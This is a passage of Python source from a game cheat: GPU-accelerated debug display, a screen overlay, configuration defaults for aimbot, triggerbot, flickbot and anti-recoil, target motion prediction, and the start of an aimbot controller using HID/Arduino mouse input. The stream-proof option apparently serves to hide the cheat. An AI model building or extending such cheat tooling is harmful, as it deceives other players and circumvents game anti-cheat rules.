            if not gpu_backend_found and os.name == 'nt':
                try:
                    # Check for DirectX backend support
                    backends = cv2.videoio_registry.getBackends()
                    if cv2.CAP_DSHOW in backends or cv2.CAP_MSMF in backends:
                        print("[+] DirectX/DXVA acceleration available")
                        self.directx_available = True
                        self.gpu_backend = "directx"
                        gpu_backend_found = True
                    else:
                        print("[-] DirectX acceleration not available")
                except Exception as e:
                    print(f"[-] DirectX detection error: {e}")
            
            # 4. Intel Quick Sync (Intel GPUs)
            if not gpu_backend_found:
                try:
                    # Check for Intel Media SDK
                    if hasattr(cv2, 'videoio_registry'):
                        backends = cv2.videoio_registry.getBackends()
                        if cv2.CAP_INTEL_MFX in backends:
                            print("[+] Intel Quick Sync acceleration available")
                            self.quicksync_available = True
                            self.gpu_backend = "quicksync"
                            gpu_backend_found = True
                except Exception as e:
                    print(f"[-] Intel Quick Sync detection error: {e}")
            
            # Set GPU flags
            if not gpu_backend_found:
                print("[-] No GPU acceleration found, using optimized CPU")
                self.cuda_available = False
                self.opencl_available = False
                self.directx_available = False
                self.quicksync_available = False
                self.gpu_backend = "cpu"
                
                # Enhanced CPU optimizations
                try:
                    cv2.setNumThreads(0)  # Use all available CPU cores
                    cv2.setUseOptimized(True)
                    print("[+] Enhanced CPU optimizations enabled")
                except:
                    pass
            else:
                print(f"[+] GPU acceleration active: {self.gpu_backend.upper()}")
                
        except Exception as e:
            print(f"[-] GPU setup error: {e}")
            self.cuda_available = False
            self.opencl_available = False
            self.directx_available = False
            self.quicksync_available = False
            self.gpu_backend = "cpu"
    
    def set_window_properties(self):
        """Set window position and properties"""
        if getattr(self.cfg, 'debug_window_always_on_top', True):
            try:
                x = getattr(self.cfg, 'spawn_window_pos_x', 100)
                y = getattr(self.cfg, 'spawn_window_pos_y', 100)
                
                if x <= -1:
                    x = 0
                if y <= -1:
                    y = 0
                
                # Small delay to ensure window is created
                def set_window_properties():
                    time.sleep(0.1)
                    try:
                        debug_window_hwnd = win32gui.FindWindow(None, self.window_name)
                        if debug_window_hwnd:
                            win32gui.SetWindowPos(debug_window_hwnd, win32con.HWND_TOPMOST, 
                                                x, y, self.window_width, self.window_height, 0)
                    except Exception as e:
                        print(f'Window positioning error: {e}')
                
                threading.Thread(target=set_window_properties, daemon=True).start()
                
            except Exception as e:
                print(f'Debug window setup error: {e}')

    def display_frame_optimized(self):
        """Display frame with multi-GPU backend optimization"""
        try:
            if self.gpu_backend == "cuda" and self.cuda_available:
                self.display_with_cuda()
            elif self.gpu_backend == "opencl" and getattr(self, 'opencl_available', False):
                self.display_with_opencl()
            elif self.gpu_backend == "directx" and getattr(self, 'directx_available', False):
                self.display_with_directx()
            else:
                self.display_with_cpu_optimized()
                
        except Exception as e:
            print(f"Display error: {e}")
            # Fallback to CPU on error
            self.display_with_cpu_optimized()
    
    def display_with_cuda(self):
        """CUDA-accelerated display"""
        try:
            if self.gpu_frame is None:
                self.gpu_frame = cv2.cuda_GpuMat()
            
            self.gpu_frame.upload(self.image)
            
            if self.scale_percent != 100:
                height = int(self.window_height * self.scale_percent / 100)
                width = int(self.window_width * self.scale_percent / 100)
                gpu_resized = cv2.cuda_GpuMat()
                cv2.cuda.resize(self.gpu_frame, (width, height), gpu_resized, interpolation=cv2.INTER_LINEAR)
                resized_frame = gpu_resized.download()
                cv2.imshow(self.window_name, resized_frame)
            else:
                cpu_frame = self.gpu_frame.download()
                cv2.imshow(self.window_name, cpu_frame)
                
        except Exception as e:
            print(f"CUDA display error: {e}")
            self.cuda_available = False
            self.gpu_backend = "cpu"
            self.display_with_cpu_optimized()
    
    def display_with_opencl(self):
        """OpenCL-accelerated display (Works with NVIDIA, AMD, Intel)"""
        try:
            # Convert to UMat for OpenCL acceleration
            umat_image = cv2.UMat(self.image)
            
            if self.scale_percent != 100:
                height = int(self.window_height * self.scale_percent / 100)
                width = int(self.window_width * self.scale_percent / 100)
                # OpenCL accelerated resize
                umat_resized = cv2.resize(umat_image, (width, height), interpolation=cv2.INTER_LINEAR)
                # Convert back to regular Mat for display
                resized_frame = umat_resized.get()
                cv2.imshow(self.window_name, resized_frame)
            else:
                # Convert back to regular Mat for display
                cpu_frame = umat_image.get()
                cv2.imshow(self.window_name, cpu_frame)
                
        except Exception as e:
            print(f"OpenCL display error: {e}")
            self.opencl_available = False
            self.gpu_backend = "cpu"
            self.display_with_cpu_optimized()
    
    def display_with_directx(self):
        """DirectX-accelerated display (Windows only)"""
        try:
            # Use hardware-accelerated resize if available
            if self.scale_percent != 100:
                height = int(self.window_height * self.scale_percent / 100)
                width = int(self.window_width * self.scale_percent / 100)
                # Use optimized resize with INTER_LINEAR_EXACT for better performance
                resized = cv2.resize(self.image, (width, height), interpolation=cv2.INTER_LINEAR_EXACT)
                cv2.imshow(self.window_name, resized)
            else:
                cv2.imshow(self.window_name, self.image)
                
        except Exception as e:
            print(f"DirectX display error: {e}")
            self.directx_available = False
            self.gpu_backend = "cpu"
            self.display_with_cpu_optimized()
    
    def display_with_cpu_optimized(self):
        """Highly optimized CPU display"""
        try:
            if self.scale_percent != 100:
                height = int(self.window_height * self.scale_percent / 100)
                width = int(self.window_width * self.scale_percent / 100)
                
                # Use fastest CPU interpolation
                resized = cv2.resize(self.image, (width, height), interpolation=cv2.INTER_NEAREST)
                cv2.imshow(self.window_name, resized)
            else:
                cv2.imshow(self.window_name, self.image)
        except Exception as e:
            print(f"CPU display error: {e}")
            self.running = False

    def update_frame(self, frame):
        """Update frame for display - non-blocking like original"""
        if self.running and frame is not None:
            try:
                # Clear multiple old frames if queue is backing up
                while not self.queue.empty():
                    try:
                        self.queue.get_nowait()
                    except queue.Empty:
                        break
                
                # Add new frame (non-blocking)
                try:
                    self.queue.put_nowait(frame.copy())
                except queue.Full:
                    pass  # Skip frame if queue is full - prevents blocking
            except Exception as e:
                # Silently handle any frame update errors to prevent spam
                pass

    def destroy(self):
        """Clean up windows"""
        cv2.destroyAllWindows()
        self.running = False

class OverlayConfigBridge:
    """Bridge between config manager and overlay system"""
    
    def __init__(self, config_manager):
        self.config_manager = config_manager
    
    @property
    def show_overlay(self):
        return self.config_manager.get_value('show_overlay', True)
    
    @property
    def overlay_show_borders(self):
        return self.config_manager.get_value('overlay_show_borders', True)
    
    @property
    def overlay_shape(self):
        """Get overlay shape - 'circle' or 'square'"""
        return self.config_manager.get_overlay_shape()
    
    @property
    def circle_capture(self):
        return self.config_manager.get_value('circle_capture', False)
    
    @property
    def fov(self):
        return self.config_manager.get_value('fov', 320)
    
    # Additional helper methods for overlay shape
    def is_circle_overlay(self):
        """Check if overlay is set to circle"""
        return self.overlay_shape == 'circle'
    
    def is_square_overlay(self):
        """Check if overlay is set to square"""
        return self.overlay_shape == 'square'
    
    def set_overlay_shape(self, shape):
        """Set overlay shape through config manager"""
        return self.config_manager.set_overlay_shape(shape)
    
    def get_all_overlay_settings(self):
        """Get all overlay-related settings as a dictionary"""
        return {
            'show_overlay': self.show_overlay,
            'overlay_show_borders': self.overlay_show_borders,
            'overlay_shape': self.overlay_shape,
            'circle_capture': self.circle_capture,
            'fov': self.fov
        }

class Overlay:
    def __init__(self, cfg):
        self.cfg = cfg
        self.queue = queue.Queue()
        self.thread = None
        self.border_id = None
        self.root = None
        self.canvas = None
        self.running = False  # Add running flag
        
        # Skip frames so that the figures do not interfere with the detector ¯\_(ツ)_/¯
        self.frame_skip_counter = 0
        
        # New option for overlay shape - can be 'circle' or 'square'
        self.overlay_shape = getattr(cfg, 'overlay_shape', 'circle')  # Default to circle

    def run(self, width, height):
        if self.cfg.show_overlay:
            self.running = True  # Set running flag
            self.root = tk.Tk()
            
            self.root.overrideredirect(True)
            
            screen_width = self.root.winfo_screenwidth()
            screen_height = self.root.winfo_screenheight()
            
            x = (screen_width - width) // 2
            y = (screen_height - height) // 2
            
            self.root.geometry(f"{width}x{height}+{x}+{y}")
            self.root.attributes('-topmost', True)
            self.root.attributes('-transparentcolor', 'black')

            self.canvas = Canvas(self.root, bg='black', highlightthickness=0, cursor="none")
            self.canvas.pack(fill=tk.BOTH, expand=True)

            # Create mask based on shape
            if self.overlay_shape == 'circle':
                self._create_circular_mask(width, height)
            else:  # square
                self._create_square_mask(width, height)

            # Bind events to prevent interaction
            self._bind_events()

            # Show border if enabled
            if self.cfg.overlay_show_borders:
                self._create_border(width, height)

            self.process_queue()
            self.root.mainloop()

    def _bind_events(self):
        """Bind events to prevent interaction with overlay"""
        events = ["<Button-1>", "<Button-2>", "<Button-3>", "<Motion>", 
                 "<Key>", "<Enter>", "<Leave>", "<FocusIn>", "<FocusOut>"]
        
        for event in events:
            self.root.bind(event, lambda e: "break")
            self.canvas.bind(event, lambda e: "break")

    def _create_circular_mask(self, width, height):
        """Create a circular mask by filling areas outside the circle with black"""
        # Add safety check for canvas
        if self.canvas is None or not self.running:
            return
            
        radius = min(width, height) // 2
        center_x = width // 2
        center_y = height // 2
        
        # Create a large black rectangle covering the entire canvas
        self.canvas.create_rectangle(0, 0, width, height, fill='black', outline='black', tags='mask')
        
        # Create the visible circular area by drawing a circle and using it as a "hole"
        # We'll do this by creating multiple small rectangles that avoid the circular area
        step = 2  # Smaller step for smoother edges
        
        for y in range(0, height, step):
            for x in range(0, width, step):
                # Add safety check inside the loop as well
                if self.canvas is None or not self.running:
                    return
                    
                # Calculate distance from center
                distance = math.sqrt((x - center_x)**2 + (y - center_y)**2)
                
                # If point is outside the circle, draw a black rectangle
                if distance > radius:
                    self.canvas.create_rectangle(
                        x, y, x + step, y + step,
                        fill='black', outline='black', tags='mask'
                    )

    def _create_square_mask(self, width, height):
        """Create a square mask - no masking needed for square"""
        # For square overlay, we don't need any masking
        # Just create a transparent background
        pass

    def _create_border(self, width, height):
        """Create border based on overlay shape"""
        # Add safety check for canvas
        if self.canvas is None or not self.running:
            return
            
        if self.overlay_shape == 'circle':
            # Circular border
            radius = min(width, height) // 2
            center_x = width // 2
            center_y = height // 2
            self.border_id = self.canvas.create_oval(
                center_x - radius, center_y - radius,
                center_x + radius, center_y + radius,
                outline='#c8a2c8', width=1, fill='', tags='border'
            )
        else:
            # Square border
            border_size = min(width, height)
            center_x = width // 2
            center_y = height // 2
            half_size = border_size // 2
            self.border_id = self.canvas.create_rectangle(
                center_x - half_size, center_y - half_size,
                center_x + half_size, center_y + half_size,
                outline='#c8a2c8', width=1, fill='', tags='border'
            )

    def process_queue(self):
        # Check if we should continue running
        if not self.running or self.canvas is None:
            return
            
        try:
            self.frame_skip_counter += 1
            if self.frame_skip_counter % 3 == 0:
                if not self.queue.empty():
                    # Only delete items that aren't the border or mask
                    self._clear_drawings()
                    while not self.queue.empty() and self.running:
                        command, args = self.queue.get()
                        if self.canvas is not None:  # Extra safety check
                            command(*args)
                else:
                    # Only delete items that aren't the border or mask
                    self._clear_drawings()
            
            # Check if root exists and we're still running before scheduling next call
            if self.root and self.running:
                self.root.after(2, self.process_queue)
                
        except Exception as e:
            # Log error but don't crash
            print(f"[-] Error in overlay process_queue: {e}")
            if self.running:
                # Try to recover
                if self.root:
                    self.root.after(10, self.process_queue)

    def _clear_drawings(self):
        """Clear all drawings except mask and border"""
        # Add comprehensive safety checks
        if self.canvas is None or not self.running:
            return
            
        try:
            # Get all items safely
            items = self.canvas.find_all()
            for item in items:
                # Extra safety check for each item
                if self.canvas is None or not self.running:
                    break
                    
                try:
                    tags = self.canvas.gettags(item)
                    if item != self.border_id and 'mask' not in tags and 'border' not in tags:
                        self.canvas.delete(item)
                except Exception:
                    # Item might have been deleted already, skip it
                    continue
                    
        except Exception as e:
            # Log error but don't crash
            print(f"[-] Error clearing overlay drawings: {e}")

    def draw_square(self, x1, y1, x2, y2, color='white', size=1):
        if self.running:
            self.queue.put((self._draw_square, (x1, y1, x2, y2, color, size)))

    def _draw_square(self, x1, y1, x2, y2, color='white', size=1):
        if self.canvas and self.running:
            try:
                self.canvas.create_rectangle(x1, y1, x2, y2, outline=color, width=size)
            except Exception:
                pass

    def draw_oval(self, x1, y1, x2, y2, color='white', size=1):
        if self.running:
            self.queue.put((self._draw_oval, (x1, y1, x2, y2, color, size)))

    def _draw_oval(self, x1, y1, x2, y2, color='white', size=1):
        if self.canvas and self.running:
            try:
                self.canvas.create_oval(x1, y1, x2, y2, outline=color, width=size)
            except Exception:
                pass

    def draw_line(self, x1, y1, x2, y2, color='white', size=1):
        if self.running:
            self.queue.put((self._draw_line, (x1, y1, x2, y2, color, size)))

    def _draw_line(self, x1, y1, x2, y2, color='white', size=1):
        if self.canvas and self.running:
            try:
                self.canvas.create_line(x1, y1, x2, y2, fill=color, width=size)
            except Exception:
                pass

    def draw_point(self, x, y, color='white', size=1):
        if self.running:
            self.queue.put((self._draw_point, (x, y, color, size)))

    def _draw_point(self, x, y, color='white', size=1):
        if self.canvas and self.running:
            try:
                self.canvas.create_oval(x-size, y-size, x+size, y+size, fill=color, outline=color)
            except Exception:
                pass

    def draw_text(self, x, y, text, size=12, color='white'):
        if self.running:
            self.queue.put((self._draw_text, (x, y, text, size, color)))

    def _draw_text(self, x, y, text, size, color):
        if self.canvas and self.running:
            try:
                self.canvas.create_text(x, y, text=text, font=('Arial', size), fill=color)
            except Exception:
                pass

    def show(self, width, height):
        if self.thread is None or not self.thread.is_alive():
            self.thread = threading.Thread(target=self.run, args=(width, height), daemon=True, name="Overlay")
            self.thread.start()

    def stop(self):
        """Properly stop the overlay"""
        self.running = False  # Set running flag to False first
        
        # Clear the queue
        try:
            while not self.queue.empty():
                self.queue.get_nowait()
        except:
            pass
            
        # Stop the Tkinter main loop
        if self.root:
            try:
                self.root.quit()
            except:
                pass
            self.root = None
            
        # Clear canvas reference
        self.canvas = None
        self.border_id = None
        
        # Wait for thread to finish
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1.0)
        self.thread = None

    def set_shape(self, shape):
        """Set overlay shape - 'circle' or 'square'"""
        if shape in ['circle', 'square']:
            self.overlay_shape = shape
        else:
            raise ValueError("Shape must be 'circle' or 'square'")

class ConfigManager:
    """Manages configuration with real-time updates"""
    
    def __init__(self, config_path: str = CONFIG_PATH):
        self.config_path = config_path
        self.config_data = {}
        self.callbacks = []
        self.lock = threading.Lock()
        self.load_config()
    
    def load_config(self) -> Dict[str, Any]:
        """Load configuration from file"""
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, 'r') as f:
                    self.config_data = json.load(f)
                
                # Ensure kalman config exists
                if "kalman" not in self.config_data:
                    self.config_data["kalman"] = self.get_default_kalman_config()
                    self.save_config()

                # Ensure overlay_shape exists (for backward compatibility)
                if "overlay_shape" not in self.config_data:
                    self.config_data["overlay_shape"] = "circle"
                    self.save_config()

                # Ensure debug window config exists (for backward compatibility)
                if "show_debug_window" not in self.config_data:
                    self.config_data["show_debug_window"] = False
                    self.save_config()
            else:
                # Create default config if it doesn't exist
                self.config_data = self.get_default_config()
                self.save_config()
        except Exception as e:
            print(f"Error loading config: {e}")
            self.config_data = self.get_default_config()
        return self.config_data
    
    def get_default_config(self) -> Dict[str, Any]:
        """Return default configuration"""
        return {
            "fov": 320,
            "sensitivity": 1.0,
            "aim_height": 50,
            "confidence": 0.3,
            "triggerbot": False,
            "keybind": "0x02",
            "mouse_method": "hid",
            "mouse_fov": {  # NEW: Add mouse FOV settings
                "mouse_fov_width": 40,
                "mouse_fov_height": 40,
                "use_separate_fov": False  # Toggle between unified FOV and separate X/Y
            },
            "custom_resolution": {
                "use_custom_resolution": False,
                "x": 1920,
                "y": 1080
            },
            "show_overlay": True,
            "overlay_show_borders": True,
            "overlay_shape": "circle",
            "circle_capture": False,
            "show_debug_window": False,
            "kalman": self.get_default_kalman_config(),
            "model": self.get_default_model_config(),
            "hotkeys": {
                "stream_proof_key": "0x75",  # F6
                "menu_toggle_key": "0x76",   # F7
                "stream_proof_enabled": False,
                "menu_visible": True
            },
            "anti_recoil": {
                "enabled": False,
                "strength": 5.0,
                "reduce_bloom": True,
                "require_target": True,
                "require_keybind": True
            },
            "triggerbot": {
                "enabled": False,
                "confidence": 0.5,
                "fire_delay": 0.05,
                "cooldown": 0.1,
                "require_aimbot_key": True
            },
            "flickbot": {
                "enabled": False,
                "flick_speed": 0.8,
                "flick_delay": 0.05,
                "cooldown": 1.0,
                "keybind": 0x05,
                "auto_fire": True,
                "return_to_origin": True
            },
            "target_lock": {
                "enabled": True,
                "min_lock_duration": 0.5,
                "max_lock_duration": 3.0,
                "distance_threshold": 100,
                "reacquire_timeout": 0.3,
                "smart_switching": True,
                "prefer_closest": True,
                "prefer_centered": False
        }
    }
    
    def get_default_model_config(self) -> Dict[str, Any]:
        """Return default model configuration"""
        return {
            "selected_model": "auto",  # auto, or specific model path
            "model_path": "",  # Path to currently loaded model
            "available_models": [],  # List of available models
            "auto_detect": True,  # Auto-detect best available model
            "model_size": "medium",  # small, medium, large
            "use_tensorrt": True,  # Prefer TensorRT models if available
            "model_confidence_override": None,  # Model-specific confidence threshold
            "model_iou_override": None  # Model-specific IOU threshold
        }
    
    def scan_for_models(self, models_dir: str = ".") -> List[Dict[str, Any]]:
        """Scan directory for available YOLO models"""
        models = []
        
        # Define model patterns to search for
        patterns = [
            "*.engine",  # TensorRT models
            "*.pt",      # PyTorch models
            "*.onnx",    # ONNX models
        ]
        
        for pattern in patterns:
            for model_path in glob.glob(os.path.join(models_dir, pattern)):
                model_info = {
                    "path": model_path,
                    "name": os.path.basename(model_path),
                    "type": os.path.splitext(model_path)[1][1:],  # Remove the dot
                    "size": os.path.getsize(model_path) / (1024 * 1024),  # Size in MB
                    "priority": self._get_model_priority(model_path)
                }
                models.append(model_info)
        
        # Sort by priority (higher is better)
        models.sort(key=lambda x: x["priority"], reverse=True)
        
        return models
    
    def _get_model_priority(self, model_path: str) -> int:
        """Get model priority for auto-selection"""
        priority = 0
        
        # TensorRT models have highest priority
        if model_path.endswith(".engine"):
            priority += 100
        
        # Solana models have high priority
        if "solana" in model_path.lower():
            priority += 50
        
        # Larger models typically have better accuracy
        size_mb = os.path.getsize(model_path) / (1024 * 1024)
        if size_mb > 100:
            priority += 30
        elif size_mb > 50:
            priority += 20
        elif size_mb > 20:
            priority += 10
        
        return priority
    
    def get_model_config(self) -> Dict[str, Any]:
        """Get model configuration"""
        with self.lock:
            return self.config_data.get("model", self.get_default_model_config()).copy()
    
    def update_model_config(self, updates: Dict[str, Any]) -> bool:
        """Update model configuration"""
        return self.update_config({"model": updates})
    
    def get_selected_model(self) -> str:
        """Get currently selected model"""
        return self.get_value("model.selected_model", "auto")
    
    def set_selected_model(self, model_path: str) -> bool:
        """Set selected model"""
        # Update available models list
        models = self.scan_for_models()
        self.set_value("model.available_models", models)
        
        # Validate model exists if not "auto"
        if model_path != "auto":
            if not os.path.exists(model_path):
                print(f"Model not found: {model_path}")
                return False
        
        return self.set_value("model.selected_model", model_path)
    
    def get_best_available_model(self) -> Optional[str]:
        """Get the best available model based on priority"""
        models = self.scan_for_models()
        if not models:
            return None
        
        # Update available models in config
        self.set_value("model.available_models", models)
        
        # Return highest priority model
        return models[0]["path"]
    
    def get_model_for_loading(self) -> Optional[str]:
        """Get the model path to load based on configuration"""
        selected = self.get_selected_model()
        
        if selected == "auto":
            # Auto-detect best model
            return self.get_best_available_model()
        else:
            # Use specific model
            if os.path.exists(selected):
                return selected
            else:
                print(f"Selected model not found: {selected}, falling back to auto")
                return self.get_best_available_model()
    
    def get_model_specific_confidence(self) -> Optional[float]:
        """Get model-specific confidence threshold if set"""
        return self.get_value("model.model_confidence_override", None)
    
    def get_model_specific_iou(self) -> Optional[float]:
        """Get model-specific IOU threshold if set"""
        return self.get_value("model.model_iou_override", None)
    
    def set_model_overrides(self, confidence: Optional[float] = None, iou: Optional[float] = None) -> bool:
        """Set model-specific overrides"""
        updates = {}
        if confidence is not None:
            updates["model_confidence_override"] = confidence
        if iou is not None:
            updates["model_iou_override"] = iou
        
        if updates:
            return self.update_model_config(updates)
        return True
    
    def get_available_models(self) -> List[Dict[str, Any]]:
        """Get list of available models"""
        # Refresh the list
        models = self.scan_for_models()
        self.set_value("model.available_models", models)
        return models
    
    def get_default_kalman_config(self) -> Dict[str, Any]:
        """Return default Kalman filter configuration"""
        return {
            "use_kalman": True,
            "kf_p": 38.17,  # Initial covariance
            "kf_r": 2.8,    # Measurement noise
            "kf_q": 28.11,  # Process noise
            "kalman_frames_to_predict": 1.5,
            "use_coupled_xy": False,
            "xy_correlation": 0.3,
            "process_correlation": 0.2,
            "measurement_correlation": 0.1,
            "alpha_with_kalman": 1.5
        }
    
    def get_default_movement_config(self) -> Dict[str, Any]:
        """Return default movement curves configuration optimized for speed"""
        return {
            "use_curves": False,
            "curve_type": "Exponential",  # Fastest curve type
            "movement_speed": 3.0,  # Increased from 1.0
            "smoothing_enabled": True,
            "smoothing_factor": 0.1,  # Reduced from 0.3 for less smoothing
            "random_curves": False,
            "curve_steps": 5,  # Reduced from 50 for faster execution
            "bezier_control_randomness": 0.1,  # Reduced for more direct movement
            "spline_smoothness": 0.2,  # Reduced
            "catmull_tension": 0.2,  # Reduced
            "exponential_decay": 3.0,  # Increased for faster ramp
            "hermite_tangent_scale": 0.5,  # Reduced
            "sine_frequency": 2.0  # Increased for quicker cycles
        }
    
    def save_config(self) -> bool:
        """Save configuration to file"""
        try:
            with self.lock:
                os.makedirs(os.path.dirname(self.config_path), exist_ok=True)
                with open(self.config_path, 'w') as f:
                    json.dump(self.config_data, f, indent=4)
            
            # Notify all callbacks about the config change
            self.notify_callbacks()
            return True
        except Exception as e:
            print(f"Error saving config: {e}")
            return False
    
    def update_config(self, updates: Dict[str, Any]) -> bool:
        """Update configuration with new values"""
        try:
            with self.lock:
                # Handle nested updates like custom_resolution and kalman
                for key, value in updates.items():
                    if isinstance(value, dict) and key in self.config_data and isinstance(self.config_data[key], dict):
                        self.config_data[key].update(value)
                    else:
                        self.config_data[key] = value
            return self.save_config()
        except Exception as e:
            print(f"Error updating config: {e}")
            return False
    
    def get_config(self) -> Dict[str, Any]:
        """Get current configuration"""
        with self.lock:
            return self.config_data.copy()
    
    def get_value(self, key: str, default=None):
        """Get a specific config value"""
        with self.lock:
            # Handle nested keys (e.g., "kalman.use_kalman")
            if '.' in key:
                keys = key.split('.')
                value = self.config_data
                for k in keys:
                    if isinstance(value, dict) and k in value:
                        value = value[k]
                    else:
                        return default
                return value
            return self.config_data.get(key, default)
    
    def set_value(self, key: str, value: Any) -> bool:
        """Set a specific config value"""
        # Handle nested keys
        if '.' in key:
            keys = key.split('.')
            updates = {}
            current = updates
            for i, k in enumerate(keys[:-1]):
                current[k] = {}
                current = current[k]
            current[keys[-1]] = value
            return self.update_config(updates)
        return self.update_config({key: value})
    
    def get_kalman_config(self) -> Dict[str, Any]:
        """Get Kalman filter configuration"""
        with self.lock:
            return self.config_data.get("kalman", self.get_default_kalman_config()).copy()
    
    def update_kalman_config(self, updates: Dict[str, Any]) -> bool:
        """Update Kalman filter configuration"""
        return self.update_config({"kalman": updates})
    
    # *** NEW: Movement configuration methods ***
    def get_movement_config(self) -> Dict[str, Any]:
        """Get movement curves configuration"""
        with self.lock:
            return self.config_data.get("movement", self.get_default_movement_config()).copy()
    
    def update_movement_config(self, updates: Dict[str, Any]) -> bool:
        """Update movement curves configuration"""
        return self.update_config({"movement": updates})
    
    def get_movement_curves_enabled(self) -> bool:
        """Get movement curves enabled state"""
        return self.get_value("movement.use_curves", False)
    
    def set_movement_curves_enabled(self, enabled: bool) -> bool:
        """Set movement curves enabled state"""
        return self.set_value("movement.use_curves", enabled)
    
    def get_movement_curve_type(self) -> str:
        """Get current movement curve type"""
        return self.get_value("movement.curve_type", "Bezier")
    
    def set_movement_curve_type(self, curve_type: str) -> bool:
        """Set movement curve type"""
        supported_curves = ["Bezier", "B-Spline", "Catmull", "Exponential", "Hermite", "Sine"]
        if curve_type not in supported_curves:
            print(f"Invalid curve type: {curve_type}. Must be one of {supported_curves}")
            return False
        return self.set_value("movement.curve_type", curve_type)
    
    def get_movement_speed(self) -> float:
        """Get movement speed multiplier"""
        return self.get_value("movement.movement_speed", 1.0)
    
    def set_movement_speed(self, speed: float) -> bool:
        """Set movement speed multiplier"""
        if speed <= 0:
            print("Movement speed must be greater than 0")
            return False
        return self.set_value("movement.movement_speed", speed)
    
    def get_random_curves_enabled(self) -> bool:
        """Get random curves enabled state"""
        return self.get_value("movement.random_curves", False)
    
    def set_random_curves_enabled(self, enabled: bool) -> bool:
        """Set random curves enabled state"""
        return self.set_value("movement.random_curves", enabled)
    
    def toggle_movement_curves(self) -> bool:
        """Toggle movement curves on/off"""
        current_state = self.get_movement_curves_enabled()
        new_state = not current_state
        success = self.set_movement_curves_enabled(new_state)
        if success:
            print(f"[+] Movement curves {'enabled' if new_state else 'disabled'}")
        return success
    
    def get_supported_curve_types(self) -> list:
        """Get list of supported curve types"""
        return ["Bezier", "B-Spline", "Catmull", "Exponential", "Hermite", "Sine"]
    
    def get_overlay_shape(self) -> str:
        """Get overlay shape configuration"""
        with self.lock:
            return self.config_data.get("overlay_shape", "circle")
        
    def set_overlay_shape(self, shape: str) -> bool:
        """Set overlay shape configuration"""
        if shape not in ["circle", "square"]:
            print(f"Invalid overlay shape: {shape}. Must be 'circle' or 'square'")
            return False
        return self.set_value("overlay_shape", shape)
    
    def is_overlay_circle(self) -> bool:
        """Check if overlay is set to circle"""
        return self.get_overlay_shape() == "circle"
    
    def is_overlay_square(self) -> bool:
        """Check if overlay is set to square"""
        return self.get_overlay_shape() == "square"
    
    # NEW DEBUG WINDOW METHODS
    def get_debug_window_enabled(self) -> bool:
        """Get debug window enabled state"""
        with self.lock:
            return self.config_data.get("show_debug_window", False)
    
    def set_debug_window_enabled(self, enabled: bool) -> bool:
        """Set debug window enabled state"""
        return self.set_value("show_debug_window", enabled)
    
    def toggle_debug_window(self) -> bool:
        """Toggle debug window on/off"""
        current_state = self.get_debug_window_enabled()
        new_state = not current_state
        success = self.set_debug_window_enabled(new_state)
        if success:
            print(f"[+] Debug window {'enabled' if new_state else 'disabled'}")
    
    def register_callback(self, callback):
        """Register a callback to be called when config changes"""
        self.callbacks.append(callback)
    
    def notify_callbacks(self):
        """Notify all registered callbacks about config changes"""
        for callback in self.callbacks:
            try:
                callback(self.config_data)
            except Exception as e:
                print(f"Error in config callback: {e}")

class TargetTracker:
    """Advanced target tracking with motion prediction"""
    
    def __init__(self):
        self.tracked_targets = {}  # Store target history for prediction
        self.max_history = 10  # Keep last 10 frames of target data
        
    def update_target(self, target_id, position, timestamp):
        """Update target tracking history"""
        if target_id not in self.tracked_targets:
            self.tracked_targets[target_id] = []
        
        self.tracked_targets[target_id].append({
            'position': position,
            'timestamp': timestamp
        })
        
        # Keep only recent history
        if len(self.tracked_targets[target_id]) > self.max_history:
            self.tracked_targets[target_id].pop(0)
    
    def predict_position(self, target_id, current_time):
        """Predict where the target will be based on motion history"""
        if target_id not in self.tracked_targets or len(self.tracked_targets[target_id]) < 2:
            return None
        
        history = self.tracked_targets[target_id]
        
        # Calculate velocity from last two positions
        last = history[-1]
        prev = history[-2]
        
        dt = last['timestamp'] - prev['timestamp']
        if dt <= 0:
            return last['position']
        
        vx = (last['position'][0] - prev['position'][0]) / dt
        vy = (last['position'][1] - prev['position'][1]) / dt
        
        # Predict position
        time_delta = current_time - last['timestamp']
        predicted_x = last['position'][0] + vx * time_delta
        predicted_y = last['position'][1] + vy * time_delta
        
        return (predicted_x, predicted_y)
    
    def cleanup_old_targets(self, current_time, timeout=2.0):
        """Remove targets that haven't been seen recently"""
        to_remove = []
        for target_id, history in self.tracked_targets.items():
            if history and current_time - history[-1]['timestamp'] > timeout:
                to_remove.append(target_id)
        
        for target_id in to_remove:
            del self.tracked_targets[target_id]

class AimbotController:
    """Controls the aimbot with dynamic config updates"""
    
    def __init__(self, config_manager: ConfigManager):
        self.config_manager = config_manager
        self.running = False
        self.thread = None
        self.smoother = None
        self.model = None
        self.camera = None
        self.mouse_dev = None
        self.mouse_lock = threading.Lock()
        self.initialize_target_tracker()

         # Mouse FOV settings (NEW)
        self.mouse_fov_width = 40
        self.mouse_fov_height = 40
        self.use_separate_fov = False
        
        # DPI settings for calculation (NEW)
        self.dpi = 800  # Default DPI
        self.mouse_sensitivity = 1.0  # Windows mouse sensitivity

        # Add stream-proof manager
        self.stream_proof = StreamProofManager()

        # Hotkey settings
        self.menu_toggle_key = 0x76  # F7 by default
    
        # Menu visibility state
        self.menu_visible = True
        self.config_app_reference = None

        # Overlay components
        self.overlay = None
        self.overlay_initialized = False

        # Compact debug window
        self.visuals = None
        self.visuals_enabled = False

        # *** NEW: Movement curves integration ***
        self.movement_curves = MovementCurves()
        self.current_mouse_position = (0, 0)

        # Anti-recoil system (pass self to it)
        self.anti_recoil = SmartArduinoAntiRecoil(self)
        self.load_anti_recoil_config()

        # Target tracking for anti-recoil
        self.has_target = False
        self.last_target_time = 0

        self.triggerbot = Triggerbot(self)
        self.flickbot = Flickbot(self)
    
        # Load their configurations
        self.load_triggerbot_config()
        self.load_flickbot_config()

        # Add controller support
        self.controller = ControllerHandler(self)
        self.controller_enabled = False
    
        # Load controller config
        self.load_controller_config()
        
        # Current runtime settings
        self.fov = 320
        self.sensitivity = 1.0
        self.aim_height = 50
        self.confidence = 0.3
        self.keybind = "0x02"
        self.mouse_method = "hid"
        self.custom_resolution = {}
        self.overlay_shape = "circle"  # Track current overlay shape

        # *** NEW: Movement curve settings ***
        self.use_movement_curves = False
        self.movement_curve_type = "Bezier"
        self.movement_speed = 1.0
        self.curve_smoothing = True
        self.random_curves = False
        
        # Kalman settings
        self.kalman_config = {}
        self.use_kalman = True
        self.kalman_frames_to_predict = 1.5
        
        # Screen dimensions
        self.full_x = 1920
        self.full_y = 1080
        self.center_x = self.full_x // 2
        self.center_y = self.full_y // 2
